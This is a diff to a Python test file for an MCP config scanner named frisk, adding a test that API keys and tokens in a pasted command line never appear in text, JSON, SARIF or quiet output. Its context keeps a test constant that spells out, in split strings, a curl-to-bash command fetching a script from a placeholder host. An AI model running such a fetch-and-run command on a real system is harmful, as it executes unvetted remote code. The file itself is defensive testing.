@@ -21,7 +21,7 @@ from unittest import mock
 from _home import fake_home
 from frisk import pin
 from frisk.cli import main
-from frisk.sources import parse_mcp_config
+from frisk.sources import ServerRef, display_ref, parse_mcp_config
 
 INSTALLER = "cu" + "rl -sL https://get.example.invalid/i.sh " + "| ba" + "sh"
 
@@ -242,6 +242,30 @@ class TextEscapesTest(ReviewCase):
         code, out, _ = run(["verify", "--lockfile", lockfile])
         self.assertEqual(code, 0)
         out.encode("utf-8")
+
+
+
+class CommandLineTokenTest(ReviewCase):
+    """A whole command line pasted into 'command' (so frisk cannot resolve it) is shown by its
+    program alone: its arguments, where an API key or token may sit, reach no output."""
+
+    def test_a_pasted_command_line_shows_only_its_program(self) -> None:
+        canary = "tok" + "en-" + "8c2e" + "71aa"
+        cfg = self.config({"mcpServers": {
+            "line": {"command": "npx -y some-mcp --api-key " + canary},
+            "abs": {"command": "/nonexistent.invalid/bin/docker run -e TOKEN=" + canary + " img"},
+            "plain": {"command": "/nonexistent.invalid/bin/ghost"}}})
+        outputs = {fmt: run(["--mcp-config", cfg, *extra])[1]
+                   for fmt, extra in (("text", []), ("json", ["--json"]), ("sarif", ["--sarif"]), ("quiet", ["-q"]))}
+        for fmt, out in outputs.items():
+            with self.subTest(fmt):
+                self.assertNotIn(canary, out)
+        self.assertIn("→ npx …", outputs["text"])
+        self.assertIn("line::npx …:1", outputs["text"])
+        self.assertIn("→ /nonexistent.invalid/bin/docker …", outputs["text"])
+        self.assertIn("→ /nonexistent.invalid/bin/ghost\n", outputs["text"])  # one word: shown whole
+        # A source frisk scans is a real path and is never cut at a space.
+        self.assertEqual(display_ref(ServerRef("s", "local", "/srv/My Server", True)), "/srv/My Server")
 
 
 if __name__ == "__main__":
